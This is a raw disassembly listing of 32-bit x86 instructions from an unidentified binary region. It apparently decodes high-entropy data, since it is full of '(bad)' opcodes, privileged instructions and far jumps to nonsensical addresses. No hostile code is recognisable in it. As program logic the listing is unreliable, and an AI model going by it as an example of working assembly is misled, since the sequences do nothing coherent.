  42bb8f:	pop    ecx
  42bb90:	xor    DWORD PTR ds:0x80971225,edi
  42bb96:	and    al,0x54
  42bb98:	in     eax,dx
  42bb99:	xchg   esp,eax
  42bb9a:	mov    eax,0x7ef67705
  42bb9f:	push   ds
  42bba0:	xchg   ebx,eax
  42bba1:	jmp    0xcb74:0x8d0aea11
  42bba8:	in     al,dx
  42bba9:	out    dx,eax
  42bbaa:	stc    
  42bbab:	addr16 jmp 0x436e:0x776017f5
  42bbb3:	test   dl,ch
  42bbb5:	or     eax,0x334700d9
  42bbba:	pop    esi
  42bbbb:	gs icebp 
  42bbbd:	adc    DWORD PTR [ebx+0x67],esp
  42bbc0:	pop    esi
  42bbc1:	rcr    ebx,1
  42bbc3:	int3   
  42bbc4:	mov    ebp,0xf4bc7976
  42bbc9:	call   0x22f2:0x707ca573
  42bbd0:	(bad)  
  42bbd1:	jecxz  0x42bb5e
  42bbd3:	sub    al,0xc9
  42bbd5:	dec    esi
  42bbd6:	mov    ds:0x766ccadb,eax
  42bbdb:	xchg   edi,eax
  42bbdc:	jne    0x42bba2
  42bbde:	adc    al,0xe9
  42bbe0:	push   ds
  42bbe1:	int3   
  42bbe2:	push   esp
  42bbe3:	fistp  DWORD PTR [esi+0xf8939f8]
  42bbe9:	push   edx
  42bbea:	ins    BYTE PTR es:[edi],dx
  42bbeb:	mov    bl,0x9
  42bbed:	cli    
	...
  42bc56:	xor    al,0x28
  42bc58:	add    DWORD PTR [esi],eax
  42bc5a:	sbb    eax,0x233a372f
  42bc5f:	sub    DWORD PTR [ebx],eax
  42bc61:	dec    ecx
  42bc62:	std    
  42bc63:	fcomp  QWORD PTR [ebx]
  42bc65:	fisub  DWORD PTR [edi-0x2b]
  42bc68:	add    DWORD PTR [eax],eax
  42bc6a:	add    BYTE PTR [ecx],al
  42bc6c:	add    BYTE PTR [eax],al
  42bc6e:	lock mov ebp,0x8d44b9c4
  42bc74:	xlat   BYTE PTR ds:[ebx]
  42bc75:	jl     0x42bc7a
  42bc77:	dec    eax
  42bc78:	mov    ch,0x6
  42bc7a:	lods   eax,DWORD PTR ds:[esi]
  42bc7b:	add    cl,BYTE PTR [ebp+ebp*1+0x27]
  42bc7f:	in     eax,dx
  42bc80:	stos   BYTE PTR es:[edi],al
  42bc81:	mov    ds:0x59090e5d,eax
  42bc86:	(bad)  
  42bc87:	jmp    FWORD PTR [ecx]
  42bc89:	loop   0x42bc95
  42bc8b:	icebp  
  42bc8c:	inc    ebp
  42bc8d:	js     0x42bc5c
  42bc8f:	dec    eax
  42bc90:	xor    BYTE PTR [esi+0x417c5425],0x39
  42bc97:	(bad)  
  42bc98:	cmc    
  42bc99:	fidivr WORD PTR [ecx]
  42bc9b:	call   0x3a5a:0x13728bcb
  42bca2:	dec    ecx
  42bca3:	int    0xfa
  42bca5:	mov    ebp,0xea88747f
  42bcaa:	ja     0x42bc83
  42bcac:	imul   BYTE PTR [ecx+eiz*1]
  42bcaf:	mov    al,0x3f
  42bcb1:	(bad)  
  42bcb2:	lods   eax,DWORD PTR ds:[esi]
  42bcb3:	and    al,0xea
  42bcb5:	addr16 enter 0x6d24,0x76
  42bcba:	xor    BYTE PTR [ebx+0x53],al
  42bcbd:	mov    dh,0xf9
  42bcbf:	aam    0x4d
  42bcc1:	loopne 0x42bc44
  42bcc3:	repnz mov ebx,0xed893c09
  42bcc9:	lock sub eax,0x96178639
  42bccf:	inc    esp
  42bcd0:	call   0x1ee7996f
  42bcd5:	add    ch,cl
  42bcd7:	(bad)  
  42bcd8:	iret   
  42bcd9:	sub    cl,BYTE PTR [ecx+0x18]
  42bcdc:	and    ch,BYTE PTR [ebp+0x55]
  42bcdf:	ins    DWORD PTR es:[edi],dx
  42bce0:	dec    esi
  42bce1:	cmp    esi,DWORD PTR [edx]
  42bce3:	ds lahf 
  42bce5:	jne    0x42bc9d
  42bce7:	lods   al,BYTE PTR ds:[esi]
  42bce8:	iret   
  42bce9:	or     dl,ah
  42bceb:	(bad)  
  42bcec:	push   ebp
  42bced:	stos   DWORD PTR es:[edi],eax
  42bcee:	clc    
  42bcef:	ror    BYTE PTR [edi+ecx*2+0x3e],cl
  42bcf3:	sub    eax,0xd513572b
  42bcf8:	mov    esi,0x9d94b714
  42bcfd:	loopne 0x42bcd6
  42bcff:	das    
  42bd00:	pop    esi
  42bd01:	into   
  42bd02:	mov    bh,0xb
  42bd04:	ins    DWORD PTR es:[edi],dx
  42bd05:	mov    cl,0xe0
  42bd07:	push   ecx
  42bd08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd09:	cld    
  42bd0a:	mov    ds:0x412bd29,eax
  42bd0f:	cmp    esi,DWORD PTR [eax+0x7872dce4]
  42bd15:	lock call 0x940e:0xb5aeecff
  42bd1d:	push   es
  42bd1e:	cs popa 
  42bd20:	sti    
  42bd21:	repz mov edi,edx
  42bd24:	imul   edi,DWORD PTR [ecx+ecx*2],0xb5640d1a
  42bd2b:	pop    ecx
  42bd2c:	pop    ecx
  42bd2d:	fadd   QWORD PTR ds:0xd02a5eeb
  42bd33:	cmp    edi,DWORD PTR [ebx-0x1d]
  42bd36:	out    0xb5,eax
  42bd38:	xlat   BYTE PTR ds:[ebx]
  42bd39:	test   BYTE PTR [edi-0x63],0x9e
  42bd3d:	jns    0x42bcc5
  42bd3f:	push   ebx
  42bd40:	pop    eax
  42bd41:	dec    edi
  42bd42:	push   ds
  42bd43:	or     eax,0xa041ed96
  42bd48:	jmp    0x6fa:0xe9545af4
  42bd4f:	imul   esi,DWORD PTR [edx-0x69286e1a]
  42bd56:	sub    al,0xd3
  42bd58:	push   cs
  42bd59:	jmp    0x42bcde
  42bd5b:	std    
  42bd5c:	or     eax,0xe00d7e91
  42bd61:	dec    eax
  42bd62:	dec    edi
  42bd63:	inc    ecx
  42bd64:	cmp    DWORD PTR [edi],ebp
  42bd66:	push   ds
  42bd67:	jge    0x42bdc9
  42bd69:	test   eax,0xaa08f59a
	...
  42bdd6:	mov    al,0xb6
  42bdd8:	pushf  
  42bdd9:	adc    al,0x9e
  42bddb:	ds mov eax,0xffec3b6
  42bde1:	jae    0x42be1f
  42bde3:	adc    al,0x71
  42bde5:	cmp    esp,DWORD PTR [edi-0x2a]
  42bde8:	add    DWORD PTR [eax],eax
  42bdea:	add    BYTE PTR [ecx],al
  42bdec:	add    BYTE PTR [eax],al
  42bdee:	hlt    
  42bdef:	mov    bl,BYTE PTR [ebx+0x55f167bb]
  42bdf5:	xor    al,0x87
  42bdf7:	jbe    0x42bda5
  42bdf9:	repz pop ebp
  42bdfb:	les    ebp,FWORD PTR [esi+0x32d2c3c4]
  42be01:	and    cl,dl
  42be03:	xchg   esp,eax
  42be04:	xor    al,0xcd
  42be06:	or     ecx,DWORD PTR [eax+0x49]
  42be09:	sbb    edi,edx
  42be0b:	imul   esi,DWORD PTR [ebp+0x21],0x73
  42be0f:	xchg   esi,eax
  42be10:	xchg   edi,eax
  42be11:	imul   ebx,ebp,0xffffff96
  42be14:	ud0    ebx,esp
  42be17:	outs   dx,BYTE PTR ds:[esi]
  42be18:	sub    al,0x45
  42be1a:	adc    BYTE PTR [edi+0x16],bl
  42be1d:	lods   al,BYTE PTR ds:[esi]
  42be1e:	jmp    0x42be35
  42be20:	mov    ds,WORD PTR [edi]
  42be22:	gs test al,0xfb
  42be25:	xor    BYTE PTR [ebx+0x6204abd1],0xde
  42be2c:	jge    0x42be44
  42be2e:	cld    
  42be2f:	ret    0x401e
  42be32:	or     DWORD PTR [ebx+0x4d],ebx
  42be35:	push   0x49
  42be37:	adc    bh,ah
  42be39:	stc    
  42be3a:	stc    
  42be3b:	stc    
  42be3c:	icebp  
  42be3d:	xor    al,0x87
  42be3f:	adc    ch,BYTE PTR [eax-0x4d]
  42be42:	add    dl,BYTE PTR [edi+0x6ceaac78]
  42be48:	out    dx,eax
  42be49:	adc    dh,dl
  42be4b:	mov    al,0x35
  42be4d:	(bad)  
  42be4e:	push   ebp
  42be4f:	lock xor bh,BYTE PTR [esp+edi*2]
  42be53:	scas   al,BYTE PTR es:[edi]
  42be54:	call   0x543e:0xb43c42fa
  42be5b:	ret    0x4b8a
  42be5e:	iret   
  42be5f:	fadd   DWORD PTR [eax-0x54]
  42be62:	cwde   
  42be63:	test   BYTE PTR [esi-0x478ab75a],0x12
  42be6a:	push   0x41
  42be6c:	cld    
  42be6d:	ss stc 
  42be6f:	clc    
  42be70:	xor    eax,0xb1595d1
  42be75:	mov    BYTE PTR [ebp+0x5f5640f4],ch
  42be7b:	jno    0x42be7f
  42be7d:	add    DWORD PTR [esi],edi
  42be7f:	cmp    esi,DWORD PTR [edx+edx*1+0x43]
  42be83:	xor    BYTE PTR [esi+0x39],dh
  42be86:	adc    ebx,DWORD PTR [ecx-0x714bd672]
  42be8c:	jmp    0xcd446716
  42be91:	ds push ebx
  42be93:	pop    edi
  42be94:	fsubr  DWORD PTR [edi-0x546ff55e]
  42be9a:	addr16 je 0x42bec8
  42be9d:	push   ebx
  42be9e:	fsub   QWORD PTR [eiz*4-0x4cdc1a3e]
  42bea5:	cwde   
  42bea6:	rcr    DWORD PTR [ecx],cl
  42bea8:	daa    
  42bea9:	dec    ecx
  42beaa:	scas   al,BYTE PTR es:[edi]
  42beab:	fisub  DWORD PTR [ebx+ecx*2]
  42beae:	fs jae 0x42bed5
  42beb1:	je     0x42bed3
  42beb3:	pop    edx
  42beb4:	repz sar BYTE PTR [edi],0x25
  42beb8:	add    eax,0x9b5f8f70
  42bebd:	stc    
  42bebe:	adc    ch,BYTE PTR [eax]
  42bec0:	js     0x42bef0
  42bec2:	dec    esp
  42bec3:	or     eax,0x9c13b075
  42bec8:	jbe    0x42befa
  42beca:	xor    DWORD PTR [ebx+0x74],ecx
  42becd:	into   
  42bece:	pop    ebp
  42becf:	leave  
  42bed0:	rol    BYTE PTR [ebp+0x5522c4e0],0xf0
  42bed7:	pop    ds
  42bed8:	outs   dx,DWORD PTR ds:[esi]
  42bed9:	dec    ebx
  42beda:	push   0x5aea6eb9
  42bedf:	mov    ch,0x5
  42bee1:	pushf  
  42bee2:	jge    0x42bf37
  42bee4:	jbe    0x42beb2
  42bee6:	jne    0x42bf3d
  42bee8:	mov    edx,0x6f518998
  42beed:	push   eax
	...
  42bf56:	xchg   edi,eax
  42bf57:	and    BYTE PTR [edi-0x26],al
  42bf5a:	idiv   edi
  42bf5c:	lahf   
  42bf5d:	ins    DWORD PTR es:[edi],dx
  42bf5e:	mov    ds:0x287bd7c8,eax
  42bf63:	test   eax,0xd7679a76
  42bf68:	add    DWORD PTR [eax],eax
  42bf6a:	add    BYTE PTR [ecx],al
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	into   
  42bf6f:	or     al,0x6f
  42bf71:	in     eax,0x84
  42bf73:	lds    edx,FWORD PTR [esi-0x47]
  42bf76:	lods   al,BYTE PTR ds:[esi]
  42bf77:	icebp  
  42bf78:	dec    ebp
  42bf79:	mov    esp,0x21d33d5b
  42bf7e:	call   0x2b167673
  42bf83:	icebp  
  42bf84:	hlt    
  42bf85:	popf   
  42bf86:	cmp    al,BYTE PTR [esi]
  42bf88:	test   ch,cl
  42bf8a:	(bad)  
  42bf8c:	dec    esi
  42bf8d:	mov    DWORD PTR [edi],edx
  42bf8f:	daa    
  42bf90:	fcomp  DWORD PTR [esi+0x46757cf2]
  42bf96:	in     eax,0x84
  42bf98:	fs out dx,al
  42bf9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf9b:	dec    esp
  42bf9c:	sub    ch,bh
  42bf9e:	push   ecx
  42bf9f:	xor    BYTE PTR es:[ebx],ch
  42bfa2:	cmovne ebx,DWORD PTR ds:0xea59edb3
  42bfa9:	arpl   WORD PTR [edi+0x1e94a562],bx
  42bfaf:	mov    esp,0xca4eb4c7
  42bfb4:	(bad)  
  42bfb5:	(bad)  
  42bfb7:	sub    BYTE PTR [ecx],ch
  42bfb9:	inc    esp
  42bfba:	inc    ebp
  42bfbb:	mov    bh,0x48
  42bfbd:	hlt    
  42bfbe:	cdq    
  42bfbf:	scas   eax,DWORD PTR es:[edi]
  42bfc0:	push   0x82bea713
  42bfc5:	mov    cl,0x74
  42bfc7:	pop    esp
  42bfc8:	mov    al,ah
  42bfca:	popf   
  42bfcb:	cwde   
  42bfcc:	sbb    BYTE PTR [ebp-0x62],ah
  42bfcf:	dec    ecx
  42bfd0:	das    
  42bfd1:	jne    0x42bfdf
  42bfd3:	dec    ebp
  42bfd4:	jnp    0x42c054
  42bfd6:	fild   QWORD PTR [edx]
  42bfd8:	or     al,0x8c
  42bfda:	in     eax,0xa9
  42bfdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bfdd:	lods   al,BYTE PTR ds:[esi]
  42bfde:	and    al,BYTE PTR [ecx-0x64]
  42bfe1:	js     0x42bffe
  42bfe3:	jge    0x42bffe
  42bfe5:	sbb    DWORD PTR [ecx+0x42f46585],ebp
  42bfeb:	add    ecx,DWORD PTR [ebx+0x57]
  42bfee:	pop    ss
  42bfef:	out    0x5a,eax
  42bff1:	push   esi
  42bff2:	sbb    DWORD PTR [eax],eax
  42bff4:	jne    0x42bf8b
  42bff6:	adc    DWORD PTR [ebx],edi
  42bff8:	mov    cl,0x2a
  42bffa:	imul   edi,DWORD PTR [eax-0x27],0x8eba4ad1
  42c001:	mov    eax,ds:0xd168650d
  42c006:	aad    0xdd
  42c008:	xchg   DWORD PTR [edx+0x39b317c3],ebx
  42c00e:	and    al,0x70
  42c010:	mov    ecx,0x31e5f550
  42c015:	call   0x21a7:0xb47f1423
  42c01c:	dec    ecx
  42c01d:	sbb    DWORD PTR [eax+esi*8-0x297ee408],ebp
  42c024:	dec    ebp
  42c025:	ds inc ecx
  42c027:	int3   
  42c028:	mov    al,ds:0x14ce525b
  42c02d:	jl     0x42bfbd
  42c02f:	cmp    esi,esi
  42c031:	stc    
  42c032:	popf   
  42c033:	jp     0x42c00d
  42c035:	mov    gs,WORD PTR ds:0x339d1e9b
  42c03b:	loope  0x42c072
  42c03d:	test   DWORD PTR [eax-0x2cf84f67],ecx
  42c043:	mov    dh,0xca
  42c045:	xchg   ebp,eax
  42c046:	dec    ecx
  42c047:	lods   eax,DWORD PTR ds:[esi]
  42c048:	sbb    ah,dh
  42c04a:	neg    BYTE PTR [esi]
  42c04c:	popa   
  42c04d:	xlat   BYTE PTR ds:[ebx]
  42c04e:	ins    BYTE PTR es:[edi],dx
  42c04f:	cli    
  42c050:	fcomip st,st(6)
  42c052:	(bad)  
  42c054:	(bad)  
  42c055:	in     al,dx
  42c056:	push   edx
  42c057:	or     ebx,ebx
  42c059:	(bad)  
  42c05a:	ret    0x41a2
  42c05d:	mov    ds:0xbc1ba6ef,eax
  42c062:	sub    eax,0x404d4c9c
  42c067:	push   ss
  42c068:	rol    BYTE PTR [ecx+edi*8],0xb4
  42c06c:	dec    ebp
  42c06d:	sahf   
	...
  42c0d6:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c0dc:	jg     0x42c078
  42c0de:	leave  
  42c0df:	or     DWORD PTR [edi-0x57],edi
  42c0e2:	inc    esi
  42c0e3:	mov    DWORD PTR [ecx+ecx*2+0x67],0x1d8
  42c0eb:	add    DWORD PTR [eax],eax
  42c0ed:	add    BYTE PTR [edx+0x94a354e],bh
  42c0f3:	sbb    ecx,DWORD PTR ds:0xe8e97d31
  42c0f9:	xor    DWORD PTR [ebp+0x55],ebp
  42c0fc:	jae    0x42c175
  42c0fe:	cwde   
  42c0ff:	mov    dh,0x4
  42c101:	mov    DWORD PTR [eax+0x6c6222a5],edi
  42c107:	clc    
  42c108:	clc    
  42c109:	mov    edx,0x919a8524
  42c10e:	pop    es
  42c10f:	stc    
  42c110:	pop    ss
  42c111:	mov    dh,0x6a
  42c113:	add    DWORD PTR [ebx],eax
  42c115:	sub    al,0x41
  42c117:	jnp    0x42c144
  42c119:	pop    edx
  42c11a:	(bad)  
  42c11b:	mov    cl,0xf1
  42c11d:	and    DWORD PTR [ebx+0x491d6859],esi
  42c123:	rcr    BYTE PTR [edx-0x12889616],0xe9
  42c12a:	push   edx
  42c12b:	aas    
  42c12c:	in     al,dx
  42c12d:	inc    ebp
  42c12e:	aam    0xdb
  42c130:	mov    ch,0x31
  42c132:	icebp  
  42c133:	push   0x1c
  42c135:	xchg   ecx,eax
  42c136:	imul   BYTE PTR [ebx+0x339335fe]
  42c13c:	adc    BYTE PTR [eax],al
  42c13e:	nop
  42c13f:	adc    DWORD PTR [ebp-0x3c],ebp
  42c142:	outs   dx,DWORD PTR ds:[esi]
  42c143:	leave  
  42c144:	clc    
  42c145:	adc    eax,esp
  42c147:	or     BYTE PTR [ebx-0x7af3fafd],dl
  42c14d:	les    eax,FWORD PTR [ebx]
  42c14f:	(bad)  
  42c150:	stos   DWORD PTR es:[edi],eax
  42c151:	cmp    eax,0xbe77b883
  42c156:	push   ebx
  42c157:	xchg   BYTE PTR fs:[ebp-0x18],al
  42c15b:	enter  0xce40,0x15
  42c15f:	add    dh,BYTE PTR [ebp-0x27d9639d]
  42c165:	inc    esp
  42c166:	cmp    esi,DWORD PTR [edx]
  42c168:	xor    BYTE PTR [ebx-0x33590c58],0x8
  42c16f:	addr16 pop es
  42c171:	fst    QWORD PTR [ecx]
  42c173:	mov    esi,0xff868ccc
  42c178:	add    DWORD PTR [eax+0x41],0xb8838151
  42c17f:	mov    al,0x17
  42c181:	dec    ecx
  42c182:	fst    DWORD PTR [ebx-0x1be024a1]
  42c188:	pop    eax
  42c189:	ds retf 
  42c18b:	mov    ds:0x49c98168,al
  42c190:	add    eax,0x96728c23
  42c195:	repz mov ah,0x7
  42c198:	neg    BYTE PTR [ecx+0x72]
  42c19b:	cmp    BYTE PTR [ebx-0x3a],cl
  42c19e:	sbb    DWORD PTR [eax-0x13],ecx
  42c1a1:	mov    ebx,0x9cd9aa29
  42c1a6:	sar    DWORD PTR [edi+0x61a770ff],cl
  42c1ac:	jnp    0x42c1dd
  42c1ae:	dec    ebp
  42c1af:	das    
  42c1b0:	mov    cl,0x90
  42c1b2:	test   BYTE PTR [eax+0x4f0f167b],cl
  42c1b8:	hlt    
  42c1b9:	dec    ecx
  42c1ba:	sti    
  42c1bb:	jnp    0x42c1d2
  42c1bd:	mov    ah,cl
  42c1bf:	push   0x80e02c11
  42c1c4:	mov    ebx,0x5d2b4ac5
  42c1c9:	js     0x42c1c7
  42c1cb:	dec    esi
  42c1cc:	mov    eax,0x9038d1d3
  42c1d1:	ins    BYTE PTR es:[edi],dx
  42c1d2:	test   al,0x6a
  42c1d4:	repnz sbb BYTE PTR [ebp*1+0x25ada9f8],bh
  42c1dc:	out    0x97,eax
  42c1de:	xchg   ecx,eax
  42c1df:	fist   DWORD PTR ds:0xbf6f4c12
  42c1e5:	mov    eax,ds:0x21ba21b4
  42c1ea:	sbb    al,0x24
  42c1ec:	cmp    ah,BYTE PTR [eax]
	...
  42c256:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c260:	xchg   esp,eax
  42c261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c262:	test   BYTE PTR [eax-0x269892a5],dl
  42c268:	add    DWORD PTR [eax],eax
  42c26a:	add    BYTE PTR [ecx],al
  42c26c:	add    BYTE PTR [eax],al
  42c26e:	ins    DWORD PTR es:[edi],dx
  42c26f:	xchg   ebp,eax
  42c270:	xchg   ebp,eax
  42c271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c272:	mov    ch,0xe8
  42c274:	lock and ebx,DWORD PTR [esi-0x274b8a4f]
  42c27b:	dec    ebp
  42c27c:	leave  
  42c27d:	xor    ebp,ecx
  42c27f:	sub    eax,0x482d0cdf
  42c284:	stos   DWORD PTR es:[edi],eax
  42c285:	mov    dl,0x77
  42c287:	or     DWORD PTR [edi+0x2b],eax
  42c28a:	mov    ah,0x47
  42c28c:	jp     0x42c2c9
  42c28e:	jb     0x42c2de
  42c290:	bound  esi,QWORD PTR [ecx+0x7]
  42c293:	out    0xe1,al
  42c295:	xchg   esp,eax
  42c296:	scas   al,BYTE PTR es:[edi]
  42c297:	sahf   
  42c298:	arpl   WORD PTR [ebx+0x13],sp
  42c29b:	in     eax,0xc5
  42c29d:	mov    ecx,0x909c2106
  42c2a2:	or     ecx,DWORD PTR [esi-0x53]
  42c2a5:	daa    
  42c2a6:	inc    eax
  42c2a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2a8:	sti    
  42c2a9:	push   ebx
  42c2aa:	into   
  42c2ab:	fnstsw WORD PTR [ebx]
  42c2ad:	(bad)  
  42c2ae:	sub    esp,esp
  42c2b0:	test   eax,edx
  42c2b2:	adc    eax,0x59b8d31f
  42c2b7:	pop    esp
  42c2b8:	dec    eax
  42c2b9:	or     ebp,DWORD PTR [ecx-0x33]
  42c2bc:	outs   dx,BYTE PTR ds:[esi]
  42c2bd:	aad    0xcc
  42c2bf:	test   BYTE PTR [esi+0x54005d6a],dh
  42c2c5:	arpl   WORD PTR [ecx+0x5d],cx
  42c2c8:	stc    
  42c2c9:	cdq    
  42c2ca:	aas    
  42c2cb:	pop    ss
  42c2cc:	iret   
  42c2cd:	add    DWORD PTR [edx+0x4d10b065],edx
  42c2d3:	retf   0x2f3c
  42c2d6:	icebp  
  42c2d7:	dec    esp
  42c2d8:	and    esp,edi
  42c2da:	imul   esi,DWORD PTR [edi+0x20],0xffffffaa
  42c2de:	mov    ebx,0x68b3da07
  42c2e3:	les    esp,FWORD PTR [edi+ebp*4]
  42c2e6:	pop    ecx
  42c2e7:	pop    ecx
  42c2e8:	xchg   edi,eax
  42c2e9:	(bad)  
  42c2ea:	dec    esp
  42c2eb:	adc    ebp,DWORD PTR [esi]
  42c2ed:	fwait
  42c2ee:	pop    ebp
  42c2ef:	mov    esi,0x26fc3af0
  42c2f4:	(bad)  
  42c2f5:	or     eax,esp
  42c2f7:	shr    DWORD PTR [eax-0x4619a598],1
  42c2fd:	test   eax,0x6b9410a7
  42c302:	inc    esp
  42c303:	mov    dh,0xa0
  42c305:	out    dx,al
  42c306:	add    bl,BYTE PTR [ecx+0x5]
  42c309:	sub    edi,0x1b
  42c30c:	add    BYTE PTR [ebx-0x3a5f39a6],bl
  42c312:	and    DWORD PTR [edx-0x795b0748],edi
  42c318:	imul   ecx,DWORD PTR [esi-0x16],0xffffffc2
  42c31c:	sbb    cl,dh
  42c31e:	gs std 
  42c320:	out    dx,eax
  42c321:	jge    0x42c2d2
  42c323:	xchg   ch,bh
  42c325:	fwait
  42c326:	mov    eax,0x210d77b4
  42c32b:	mov    ecx,ebp
  42c32d:	pushf  
  42c32e:	inc    ebp
  42c330:	mov    dh,0x1d
  42c332:	mov    ecx,0x94c58c51
  42c337:	dec    esi
  42c338:	cmp    eax,0xfa33aa4
  42c33d:	fmul   DWORD PTR [ebx-0xbe1b4f7]
  42c343:	mov    cl,0xe8
  42c345:	das    
  42c346:	add    esp,DWORD PTR [ebp+0x20]
  42c349:	pop    ds
  42c34a:	cmp    al,0xe4
  42c34c:	cmc    
  42c34d:	(bad)  
  42c34e:	jno    0x42c37c
  42c350:	std    
  42c351:	mov    ss:0x9a08ee45,eax
  42c357:	data16 mov ss,WORD PTR [ebx-0xc]
  42c35b:	pop    edx
  42c35c:	pop    eax
  42c35d:	sti    
  42c35e:	aaa    
  42c35f:	add    al,0x80
  42c361:	ficom  DWORD PTR [ecx]
  42c363:	ins    BYTE PTR es:[edi],dx
  42c364:	mov    BYTE PTR [ebp+0x6e],bl
  42c367:	lock pop ds
  42c369:	push   esp
  42c36a:	sbb    DWORD PTR [eax-0x22],edi
  42c36d:	into   
	...
  42c3d6:	out    0xf,al
  42c3d8:	fldcw  WORD PTR [ebp-0x7]
  42c3db:	push   esi
  42c3dd:	(bad)  
  42c3de:	in     eax,dx
  42c3df:	(bad)  
  42c3e0:	sub    eax,0x20cdccf6
  42c3e5:	cmp    eax,0x1da67
  42c3ea:	add    BYTE PTR [ecx],al
  42c3ec:	add    BYTE PTR [eax],al
  42c3ee:	(bad)  
  42c3ef:	in     al,dx
  42c3f0:	out    0x4c,al
  42c3f2:	sbb    BYTE PTR [ebp-0x6ce498d9],ch
  42c3f8:	fld    TBYTE PTR [ecx-0x5e]
  42c3fb:	repnz ss push ss
  42c3fe:	push   edi
  42c3ff:	call   0xefbe4646
  42c404:	or     BYTE PTR [esp+ebp*1-0x6caefb28],al
  42c40b:	test   BYTE PTR [ebp-0x3f2f3657],0xd3
  42c412:	into   
  42c413:	xchg   ebp,eax
  42c414:	rcr    cl,0x53
  42c417:	mov    esi,0xa8a06bc5
  42c41c:	jb     0x42c49d
  42c41e:	jg     0x42c3ce
  42c420:	mov    al,ah
  42c422:	pop    ecx
  42c423:	xchg   esi,eax
  42c424:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c425:	mov    esi,0x228dc07b
  42c42a:	jb     0x42c3b6
  42c42c:	test   eax,0xb40b9ec3
  42c431:	lods   al,BYTE PTR ds:[esi]
  42c432:	jo     0x42c439
  42c434:	sub    al,0x24
  42c436:	lahf   
  42c437:	add    ecx,0x6a
  42c43a:	iret   
  42c43b:	mov    edi,0xf64d8326
  42c440:	or     eax,0x8612dfdd
  42c445:	retf   
  42c446:	mov    al,0x18
  42c448:	fimul  WORD PTR [eax-0x4291f9d6]
  42c44e:	lock dec esi
  42c450:	cmp    eax,0x12d5a0d5
  42c455:	dec    esi
  42c456:	mul    BYTE PTR [ebp-0x50]
  42c459:	mov    ebx,0xd27d1fff
  42c45e:	jnp    0x42c3f6
  42c460:	sub    eax,0x52eecc5
  42c465:	xchg   edi,eax
  42c466:	push   esp
  42c467:	xchg   ebp,eax
  42c468:	push   edi
  42c469:	pop    ds
  42c46a:	rol    DWORD PTR [edi+edx*4],1
  42c46d:	inc    edx
  42c46e:	jle    0x42c4d0
  42c470:	out    0x52,eax
  42c472:	or     DWORD PTR [edi],0xbd8b2b4a
  42c478:	cmc    
  42c479:	mov    dl,0xa
  42c47b:	jns    0x42c48e
  42c47d:	sbb    bh,dh
  42c47f:	in     al,0x80
  42c481:	fwait
  42c482:	pop    eax
  42c483:	mov    cl,0xd3
  42c485:	fsubr  QWORD PTR [ebp-0x9029c0c]
  42c48b:	xlat   BYTE PTR ds:[ebx]
  42c48c:	dec    esi
  42c48d:	ret    
  42c48e:	xchg   ecx,eax
  42c48f:	push   eax
  42c490:	popf   
  42c491:	pop    ecx
  42c492:	(bad)  
  42c493:	cmc    
  42c494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c495:	rcr    BYTE PTR [ecx+edx*4],cl
  42c498:	and    BYTE PTR [esi-0x3e28c6db],cl
  42c49e:	popa   
  42c49f:	mov    ch,0xa8
  42c4a1:	scas   al,BYTE PTR es:[edi]
  42c4a2:	sbb    DWORD PTR [ebp-0x79],ecx
  42c4a5:	sbb    BYTE PTR [edi],0x85
  42c4a8:	push   esp
  42c4a9:	jo     0x42c51f
  42c4ab:	lahf   
  42c4ac:	dec    esp
  42c4ad:	dec    ebx
  42c4ae:	mov    edx,esi
  42c4b0:	shr    BYTE PTR [ebx-0x1d],1
  42c4b3:	cmp    bl,0x4e
  42c4b6:	int3   
  42c4b7:	mov    esi,0x2b187eb2
  42c4bc:	and    edx,DWORD PTR [esi+0x6450f652]
  42c4c2:	push   esp
  42c4c3:	mov    ds:0x3d90b279,al
  42c4c8:	shl    BYTE PTR [esp+ebp*8+0x551b783e],cl
  42c4cf:	jg     0x42c49e
  42c4d1:	xor    eax,0xbefc1cd0
  42c4d6:	(bad)
  42c4da:	jne    0x42c541
  42c4dc:	jae    0x42c50e
  42c4de:	clc    
  42c4df:	push   edi
  42c4e0:	sub    BYTE PTR [esi-0x19d83be3],cl
  42c4e6:	xchg   ebp,eax
  42c4e7:	into   
  42c4e8:	aaa    
  42c4e9:	xor    al,0x25
  42c4eb:	ret    0x34c1
	...
  42c556:	in     al,dx
  42c557:	sbb    ebp,edx
  42c559:	sahf   
  42c55a:	cmc    
  42c55b:	fsubp  st(7),st
  42c55d:	jnp    0x42c511
  42c55f:	sti    
  42c560:	enter  0x5934,0x47
  42c564:	xor    ebx,ecx
  42c566:	fild   DWORD PTR [bx+di]
  42c569:	add    BYTE PTR [eax],al
  42c56b:	add    DWORD PTR [eax],eax
  42c56d:	add    BYTE PTR [esi+0x5b],bh
  42c570:	icebp  
  42c571:	mov    eax,ds:0x549931e9
  42c576:	xchg   edx,eax
  42c577:	xchg   ch,al
  42c579:	xchg   ebp,eax
  42c57a:	and    ebx,eax
  42c57c:	out    0x6b,eax
  42c57e:	aad    0xce
  42c580:	inc    edx
  42c581:	pop    ss
  42c582:	hlt    
  42c583:	mov    eax,ds:0x49cd722f
  42c588:	fs push esp
  42c58a:	adc    ch,BYTE PTR [edi+0x69f7f082]
  42c590:	outs   dx,DWORD PTR ds:[esi]
  42c591:	pushf  
  42c592:	cmp    ch,BYTE PTR [esi-0x316b6cfe]
  42c598:	mov    ds:0x9c2bf61b,eax
  42c59d:	adc    al,0x32
  42c59f:	jb     0x42c524
  42c5a1:	xor    DWORD PTR [eax],esp
  42c5a3:	jae    0x42c5b1
  42c5a5:	outs   dx,BYTE PTR ds:[esi]
  42c5a6:	mov    bh,0x56
  42c5a8:	hlt    
  42c5a9:	xor    eax,0x210bb2b6
  42c5ae:	imul   BYTE PTR [esi]
  42c5b0:	and    ecx,DWORD PTR [ecx+0x6ff929b7]
  42c5b6:	jo     0x42c5de
  42c5b8:	in     eax,dx
  42c5b9:	ins    DWORD PTR es:[edi],dx
  42c5ba:	mov    ds:0x4a77a848,al
